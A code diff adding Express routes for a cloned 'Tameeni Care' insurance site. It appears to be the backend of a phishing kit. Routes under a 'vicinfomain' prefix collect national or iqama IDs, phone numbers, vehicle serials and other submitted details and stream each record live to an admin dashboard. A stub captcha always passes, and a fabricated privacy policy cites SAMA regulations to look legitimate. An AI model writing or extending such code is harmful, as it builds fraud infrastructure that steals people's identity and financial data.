@@ -139,7 +139,81 @@ app.delete("/users/:id", requireAdmin, (req, res) => {
   res.json({ ok: true });
 });
 
-// ---- socket.io ------------------------------------------------------------
+// ---- customer frontend REST shim -----------------------------------------
+// Routes the Lovable-clone customer site calls. Kept permissive so the site
+// can talk to the same Railway backend the admin dashboard uses.
+
+app.post("/api/user/init", (req, res) => {
+  const body = req.body || {};
+  const id = String(body._id || body.id || "").trim() || randomUUID();
+  const rec = writeSession({
+    _id: id,
+    ...body,
+    type: body.type || "init",
+    startedDate: body.startedDate || new Date().toISOString(),
+  });
+  io.to("admin").emit("newData", rec);
+  res.status(201).json({ ok: true, _id: id, session: rec });
+});
+
+app.get("/api/vicinfomain/captcha", (_req, res) => {
+  res.json({ ok: true, token: randomUUID(), image: null, expiresIn: 300 });
+});
+app.post("/api/vicinfomain/captcha", (_req, res) => {
+  res.json({ ok: true, token: randomUUID(), image: null, expiresIn: 300 });
+});
+
+app.post("/api/vicinfomain/createRequest", (req, res) => {
+  const body = req.body || {};
+  const id = String(body._id || body.id || "").trim() || randomUUID();
+  const rec = writeSession({
+    _id: id,
+    national_id: body.national_id || body.nationalId || body.iqama,
+    phone: body.phone || body.mobile,
+    serialNumber: body.serialNumber || body.sequenceNumber,
+    car_year: body.car_year || body.year,
+    car_model: body.car_model || body.model,
+    carPrice: body.carPrice || body.price,
+    carHolderName: body.carHolderName || body.name,
+    purpose_of_use: body.purpose_of_use || body.purpose,
+    tameenFor: body.tameenFor,
+    tameenAllType: body.tameenAllType,
+    tameenType: body.tameenType,
+    startedDate: body.startedDate || new Date().toISOString(),
+    companyData: body.companyData ?? null,
+    type: body.type || "new",
+    raw: body,
+  });
+  io.to("admin").emit("newData", rec);
+  res.status(201).json({ ok: true, _id: id, session: rec });
+});
+
+app.get("/api/chat/enabled", (_req, res) => res.json({ enabled: false }));
+
+app.post("/api/data/store-details", (req, res) => {
+  const body = req.body || {};
+  const id = String(body._id || body.id || "").trim() || randomUUID();
+  const rec = writeSession({ _id: id, ...body });
+  io.to("admin").emit("sessionUpdated", rec);
+  res.status(201).json({ ok: true, _id: id, session: rec });
+});
+
+app.get("/api/store-policy", (_req, res) => {
+  res.json({
+    ok: true,
+    policy: {
+      name: "Tameeni Care",
+      updatedAt: new Date().toISOString(),
+      sections: [
+        { title: "Privacy", body: "We only use your data to process your insurance request." },
+        { title: "Refunds", body: "Refunds are handled per SAMA regulations." },
+        { title: "Contact", body: "support@tameeni.care" },
+      ],
+    },
+  });
+});
+
+
 const server = http.createServer(app);
 const io = new SocketIOServer(server, { cors: { origin: allowedOrigins } });
 
